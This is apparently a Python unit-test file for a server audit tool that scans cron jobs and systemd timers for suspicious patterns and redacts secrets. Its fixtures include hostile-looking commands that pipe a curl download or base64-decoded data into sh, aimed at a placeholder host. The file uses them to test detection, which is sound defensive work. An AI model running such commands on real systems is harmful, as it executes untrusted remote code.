import json
import os
import platform
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from server_audit.collectors import scheduled_tasks as tasks


class ParsingTests(unittest.TestCase):
    def test_system_and_user_cron_formats_exclude_commands(self):
        text = 'MAILTO=PRIVATE_SENTINEL\n# comment\n*/5 * * JAN MON root curl https://example.invalid/PRIVATE_SENTINEL | sh\n@reboot root /usr/local/start.sh\n'
        jobs, assignments, issues = tasks.parse_crontab(text, True, 'root')
        self.assertEqual(assignments, 1)
        self.assertEqual(len(jobs), 2)
        self.assertEqual(issues, [])
        self.assertIn('download-to-interpreter', jobs[0]['patterns'])
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(jobs))
        jobs, _, _ = tasks.parse_crontab('@daily /usr/local/task.sh', False, 'alice')
        self.assertEqual(jobs[0]['user'], 'alice')

    def test_invalid_cron_does_not_export_arbitrary_text(self):
        jobs, _, issues = tasks.parse_crontab('secret1 secret2 secret3 secret4 secret5 root command', True, 'root')
        self.assertEqual(jobs, [])
        self.assertNotIn('secret', json.dumps(issues))

    def test_obfuscation_and_temporary_paths_are_only_signals(self):
        patterns = tasks.suspicious_patterns('echo payload | base64 -d | sh; eval "$x"; /tmp/task')
        self.assertIn('encoded-payload-decoding', patterns)
        self.assertIn('dynamic-evaluation', patterns)
        self.assertIn('temporary-path-reference', patterns)
        self.assertEqual(tasks.suspicious_patterns('/usr/sbin/logrotate /etc/logrotate.conf'), [])

    def test_script_references_do_not_expand_or_include_inline_code(self):
        self.assertEqual(tasks.script_paths('python3 /srv/task.py --token PRIVATE_SENTINEL'), ['/srv/task.py'])
        self.assertEqual(tasks.script_paths('sh -c "PRIVATE_SENTINEL"'), [])
        self.assertEqual(tasks.script_paths('/usr/local/backup'), ['/usr/local/backup'])
        self.assertEqual(tasks.script_paths('/srv/$VARIABLE/script.sh'), [])

    def test_timer_escaped_paths_are_rejected_before_shell_tokenization(self):
        targets, complete = tasks.timer_script_paths(r'{ path=/srv/my\x20task.sh ; argv[]=/srv/my\x20task.sh ; ignore_errors=no ; }')
        self.assertEqual(targets, [])
        self.assertFalse(complete)

    def test_timer_executable_identity_uses_path_not_custom_argv_zero(self):
        targets, complete = tasks.timer_script_paths('{ path=/usr/bin/python3 ; argv[]=custom-name /srv/task.py ; ignore_errors=no ; }')
        self.assertEqual(targets, ['/usr/bin/python3', '/srv/task.py'])
        self.assertTrue(complete)

    def test_interpreter_named_argument_is_not_a_script_reference(self):
        self.assertEqual(tasks.script_paths('/usr/bin/printf python3 /PRIVATE_SENTINEL'), ['/usr/bin/printf'])
        targets, complete = tasks.timer_script_paths('{ path=/usr/bin/printf ; argv[]=/usr/bin/printf python3 /PRIVATE_SENTINEL ; ignore_errors=no ; }')
        self.assertEqual(targets, ['/usr/bin/printf'])
        self.assertTrue(complete)


@unittest.skipUnless(platform.system() == 'Linux', 'Linux cron filesystem inspection')
class CollectorTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)
        self.cron = self.root / 'crontab'

    def collect(self, run, directories=()):
        with patch.object(tasks, 'CRON_FILE', self.cron), patch.object(tasks, 'CRON_DIRECTORIES', directories):
            return tasks.collect(run)

    def test_files_and_timer_execstart_are_redacted_and_never_executed(self):
        script = self.root / 'task.sh'
        script.write_text('#!/bin/sh\necho PRIVATE_SENTINEL | base64 -d | sh\n')
        script.chmod(0o777)
        self.cron.write_text('0 * * * * root ' + str(script) + '\n')
        calls = []
        def run(command):
            calls.append(command)
            self.assertEqual(command[0], 'systemctl')
            if 'list-units' in command:
                output = 'example.timer loaded active waiting Example'
            elif command[-1] == 'example.timer':
                output = 'Unit=example.service\nActiveState=active\nLastTriggerUSec=Thu 2026-09-17 00:00:00 UTC'
            else:
                output = 'User=root\nExecStart={ path=/bin/sh ; argv[]=/bin/sh -c curl https://example.invalid/PRIVATE_SENTINEL | sh ; }'
            return {'status': 'ok', 'output': output}
        report, findings = self.collect(run)
        self.assertEqual(len(report['cron_files']), 1)
        self.assertEqual(len(report['timers']), 1)
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(report))
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(findings))
        self.assertTrue(any('group/world-writable' in item['message'] for item in findings))
        self.assertTrue(any('not a malware verdict' in item['message'] for item in findings))

    def test_links_fifos_and_oversized_files_are_unknown(self):
        secret = self.root / 'secret'
        secret.write_text('PRIVATE_SENTINEL')
        self.cron.symlink_to(secret)
        with self.assertRaises(ValueError):
            tasks.read_definition(self.cron)
        fifo = self.root / 'fifo'
        os.mkfifo(fifo)
        with self.assertRaises(ValueError):
            tasks.read_definition(fifo)
        with patch.object(tasks, 'MAX_BYTES', 3), self.assertRaises(ValueError):
            tasks.read_definition(secret)

    def test_binary_executables_receive_metadata_not_pattern_scanning(self):
        binary = self.root / 'executable'
        binary.write_bytes(b'\x7fELF\x00base64 -d\x00' + b'A' * (tasks.MAX_BYTES + 10))
        content, metadata = tasks.read_definition(binary, script=True)
        self.assertEqual(content, '')
        self.assertEqual(metadata['content_status'], 'binary_metadata_only')

    def test_unavailable_timers_and_parse_failures_are_partial(self):
        self.cron.write_text('invalid cron line PRIVATE_SENTINEL\n')
        report, findings = self.collect(lambda command: {'status': 'error', 'detail': 'PRIVATE_SENTINEL'})
        self.assertEqual(report['status'], 'partial')
        self.assertEqual(report['timer_collection_status'], 'error')
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps(report))
        self.assertTrue(any(item['level'] == 'UNKNOWN' for item in findings))

    def test_file_limit_is_explicit(self):
        self.cron.write_text('* * * * * root true\n')
        with patch.object(tasks, 'MAX_FILES', 0):
            report, findings = self.collect(lambda command: {'status': 'ok', 'output': ''})
        self.assertEqual(report['status'], 'partial')
        self.assertTrue(report['issues'])

    def test_shared_script_checks_each_run_as_owner_once(self):
        from types import SimpleNamespace
        script = self.root / 'shared.sh'
        script.write_text('echo safe\n')
        self.cron.write_text(f'0 * * * * alice {script}\n0 * * * * root {script}\n0 * * * * root {script}\n')
        original = tasks.read_definition
        def read(path, script=False):
            content, metadata = original(path, script)
            # Model both owners; the temporary crontab need not be root-owned.
            metadata['uid'] = 1001 if path.name == 'shared.sh' else 0
            return content, metadata
        with patch.object(tasks, 'read_definition', side_effect=read) as reader, patch('pwd.getpwnam', side_effect=lambda name: SimpleNamespace(pw_uid=1001 if name == 'alice' else 0)):
            report, findings = self.collect(lambda command: {'status': 'ok', 'output': ''})
        owners = [item for item in findings if 'unexpected owner' in item['message']]
        self.assertEqual(len(owners), 1)
        self.assertIn('run-as UID 0', owners[0]['message'])
        self.assertEqual(len(report['referenced_files']), 1)
        self.assertEqual(reader.call_count, 2)

    def test_timer_target_body_is_inspected_without_export(self):
        script = self.root / 'timer.sh'
        script.write_text('echo PRIVATE_SENTINEL | base64 -d\n')
        def run(command):
            if 'list-units' in command:
                output = 'example.timer loaded active waiting Example'
            elif command[-1] == 'example.timer':
                output = 'Unit=example.service'
            else:
                output = f'User=root\nExecStart={{ path={script} ; argv[]={script} ; ignore_errors=no ; start_time=[n/a] ; }}'
            return {'status': 'ok', 'output': output}
        report, findings = self.collect(run)
        self.assertEqual(report['timers'][0]['referenced_scripts'], [str(script)])
        self.assertIn('encoded-payload-decoding', report['referenced_files'][0]['patterns'])
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps([report, findings]))

    def test_unsupported_timer_command_marks_coverage_unknown(self):
        def run(command):
            output = ('example.timer loaded active waiting Example' if 'list-units' in command else
                      'Unit=example.service' if command[-1] == 'example.timer' else
                      'User=root\nExecStart=UNSUPPORTED_PRIVATE_SENTINEL')
            return {'status': 'ok', 'output': output}
        report, findings = self.collect(run)
        self.assertEqual(report['status'], 'partial')
        self.assertEqual(report['timers'][0]['status'], 'unknown')
        self.assertNotIn('PRIVATE_SENTINEL', json.dumps([report, findings]))


if __name__ == '__main__':
    unittest.main()
